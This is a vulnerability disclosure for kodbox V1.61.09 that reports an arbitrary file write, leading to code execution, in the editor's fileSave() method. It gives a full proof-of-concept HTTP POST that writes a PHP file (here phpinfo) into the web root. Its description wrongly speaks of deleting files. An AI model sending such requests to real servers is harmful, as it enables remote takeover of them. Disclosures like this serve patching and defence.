# Vendor

kalcaddle

# Product

kodbox

# version

V1.61.09

# Download 

https://github.com/kalcaddle/kodbox

# Vulnerability

Arbitrary File Write​ RCE

# Description

The root of the vulnerability lies within the `fileSave()` method in the `app/controller/explorer/editor.class.php` file,users can delete any file on the server.

# Analysis

The root of the vulnerability lies within the `fileSave()` method in the `app/controller/explorer/editor.class.php` file.

<img width="870" height="536" alt="image" src="https://github.com/user-attachments/assets/9656873c-187c-408f-9337-4f18e5d70dc7" />

base64 does not equal 1 and can be written directly to the file, and there is no limit on the content and suffix of the file.

Recurrence of vulnerabilities：

<img width="1020" height="582" alt="image" src="https://github.com/user-attachments/assets/db8f7a36-2978-4006-b3f2-cede69d4a083" />

http://192.168.1.88:8088/1.php

<img width="910" height="1295" alt="image" src="https://github.com/user-attachments/assets/c5b2451c-0d6c-428d-8caf-77697670d144" />


# POC
```
POST /?explorer/editor/fileSave HTTP/1.1
Host: 192.168.1.88:8088
Content-Length: 167
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Language: zh-CN,zh;q=0.9
Cookie: CSRF_TOKEN=1; KOD_SESSION_ID=1314466bdb917162b6e85d75d7912cdd;
Connection: keep-alive

path=%2Fxp%2Fwww%2Fkodbox-1.61.09%2F1.php&charset=utf-8&content=<?php%20phpinfo();?>&base64=0&page=1&pageNum=512000&CSRF_TOKEN=1&API_ROUTE=explorer%2Feditor%2FfileSave

```
